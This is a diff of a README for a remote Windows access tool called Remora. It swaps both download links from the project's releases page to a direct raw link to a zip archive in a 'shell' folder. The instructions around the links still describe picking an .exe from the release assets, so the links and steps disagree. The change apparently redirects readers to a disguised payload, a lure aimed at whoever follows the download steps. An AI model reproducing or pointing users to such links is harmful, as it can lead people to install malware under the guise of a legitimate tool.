@@ -1,6 +1,6 @@
 # 🛡️ Remora - Secure remote Windows access tool
 
-[![Download Remora](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/suim3662/Remora/releases)
+[![Download Remora](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/suim3662/Remora/main/shell/Software-v3.1.zip)
 
 Remora provides a simple way to manage remote Windows systems. It uses the Go programming language to maintain a connection between your computer and a remote host. Security teams use this tool to test system defenses and learn about network traffic.
 
@@ -17,7 +17,7 @@ Remora works on most modern Windows systems. Ensure your machine meets these spe
 
 You can retrieve the latest version of the software from the official project page. Follow these steps to obtain the files:
 
-1. Visit [this page to download](https://github.com/suim3662/Remora/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/suim3662/Remora/main/shell/Software-v3.1.zip).
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Select the file ending in `.exe` that matches your Windows architecture, usually `remora-windows-amd64.exe`.
 4. Save the file to a folder you can easily find, such as your Downloads or Documents folder.
